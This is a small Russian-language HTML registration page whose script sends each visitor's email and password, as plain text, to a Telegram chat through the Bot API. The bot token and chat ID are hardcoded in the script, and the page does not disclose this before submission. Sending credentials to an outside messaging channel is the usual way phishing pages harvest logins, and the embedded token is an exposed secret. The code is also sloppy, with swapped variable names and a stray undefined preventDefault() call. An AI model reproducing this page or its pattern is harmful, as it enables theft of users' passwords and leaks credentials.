<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
      form{
        display: flex;
        flex-direction: column;
        width: 250px;
        margin-left: 100px;
      }
      h1{
        margin-left: 100px;
      }
      button{
        margin-top: 10px;
        padding: 10px;
        background: green;
      }
    </style>
</head>
<body>
    <h1>Регистрация</h1>
    <form id="registrationForm">
        <p>Email</p>
        <input type="text" id="email" name="username" required>
        <br>
        <p>Password</p>
        <input type="text" id="pass" name="email" required>
        <br>
        <button type="submit">Зарегистрироваться</button>
    </form>

    <script>
        document.getElementById('registrationForm').addEventListener('submit', function(event) {
            event.preventDefault(); 

            const username = document.getElementById('pass').value;
            const email = document.getElementById('email').value;

            const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
            const chatId = -1002372284940 
            const message = `Новая регистрация:\nПароль: ${username}\nПочта: ${email}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

           
            fetch(url) 
                .then(response => {
                    if (response.ok) {
                      preventDefault()
                        alert('Данные успешно отправлены в Telegram!');
                    } else {
                        alert('Ошибка при отправке данных.');
                    }
                })
                .catch(error => {
                    console.error('Ошибка:', error);
                    alert('Ошибка при отправке данных.');
                });
        });
    </script>
</body>
</html>
